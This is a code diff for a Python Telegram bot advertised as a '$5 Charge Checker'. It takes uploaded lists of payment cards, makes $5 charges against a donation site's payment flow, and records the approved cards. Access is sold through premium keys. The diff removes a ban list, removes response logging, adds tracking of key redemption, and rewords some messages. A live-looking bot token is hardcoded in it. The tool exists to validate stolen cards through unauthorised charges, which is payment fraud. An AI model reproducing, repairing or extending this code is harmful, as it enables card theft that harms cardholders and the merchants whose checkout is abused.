@@ -11,7 +11,6 @@ BOT_TOKEN = "8783810252:AAEv2GtOJYG_-iBv1AMjvV8Le3kZBo9FJb0"
 OWNER_ID = 7077294261
 
 PREMIUM_FILE = "premium.json"
-BANNED_FILE = "banned_users.json"
 KEYS_FILE = "keys.json"
 CC_FILE = "approved.txt"
 
@@ -41,7 +40,7 @@ async def save_json(filename, data):
 
 async def is_premium(user_id):
     data = await load_json(PREMIUM_FILE)
-    uid = str(user_id)  # Fixed: Convert to string
+    uid = str(user_id)
     if uid not in data:
         return False
     try:
@@ -50,16 +49,12 @@ async def is_premium(user_id):
     except:
         return False
 
-async def is_banned(user_id):
-    data = await load_json(BANNED_FILE)
-    return str(user_id) in data
-
 # ================== KEY SYSTEM ==================
 async def generate_key(days: int = 30):
     import secrets
     key = "GIVEWP-" + secrets.token_hex(8).upper()
     data = await load_json(KEYS_FILE)
-    data[key] = {"days": days, "used": False}
+    data[key] = {"days": days, "used": False, "created": str(datetime.now())}
     await save_json(KEYS_FILE, data)
     return key
 
@@ -68,17 +63,22 @@ async def redeem_key(user_id, key: str):
     premium = await load_json(PREMIUM_FILE)
     uid = str(user_id)
     key = key.strip().upper()
+    
     if key not in data or data[key].get("used"):
         return "❌ Invalid or already used key!"
+    
     days = data[key]["days"]
     expiry = datetime.now() + datetime.timedelta(days=days)
     premium[uid] = {"expiry": expiry.isoformat(), "plan": f"{days} days"}
     data[key]["used"] = True
+    data[key]["used_by"] = uid
+    data[key]["used_at"] = str(datetime.now())
+    
     await save_json(KEYS_FILE, data)
     await save_json(PREMIUM_FILE, premium)
-    return f"✅ Premium activated for {days} days!"
+    return f"✅ Success! Premium activated for {days} days."
 
-# ================== REAL CHARGE FUNCTION ==================
+# ================== CHARGE FUNCTION (Real) ==================
 async def charge_5_dollars(card: str):
     try:
         cc, mm, yy, cvv = [x.strip() for x in card.split('|')]
@@ -104,8 +104,6 @@ async def charge_5_dollars(card: str):
                 timeout=30
             ) as r:
                 text = await r.text()
-                print(f"[{current_time}] RESPONSE: {r.status} | {text[:200]}")
-
                 if r.status in (200, 201) and any(x in text.lower() for x in ["success", "approved", "charged"]):
                     return {"status": "Approved", "response": "Card Added (succeeded)"}
                 else:
@@ -134,11 +132,11 @@ async def send_approved(event, card, info):
 """
     await event.reply(msg)
 
-# ================== START UI ==================
+# ================== START ==================
 @client.on(events.NewMessage(pattern=r'(?i)^[/.](start|help)$'))
 async def start(event):
     if not await is_premium(event.sender_id):
-        return await event.reply("**❌ No Access**\n\nSend `/key YOURKEY` to activate.")
+        return await event.reply("**❌ No Access**\n\nSend `/key YOURKEY` to activate premium.")
     await event.reply(
         "**🔥 WeAnimals Media $5 Charge Checker**\n\n"
         "Send `.txt` file with cards\n"
@@ -159,7 +157,7 @@ async def genkey(event):
 async def redeem(event):
     key = event.pattern_match.group(1)
     if not key:
-        return await event.reply("Usage: `/key KEY`")
+        return await event.reply("Usage: `/key YOURKEY`")
     msg = await redeem_key(event.sender_id, key)
     await event.reply(msg)
 
@@ -168,7 +166,7 @@ async def txt_handler(event):
     if not event.document or not str(event.file.name).lower().endswith('.txt'):
         return
     if not await is_premium(event.sender_id):
-        return await event.reply("❌ No Access! Use /key")
+        return await event.reply("❌ No Access! Use /key first.")
 
     await event.reply("📂 Processing TXT file...")
     path = f"temp_{event.sender_id}.txt"
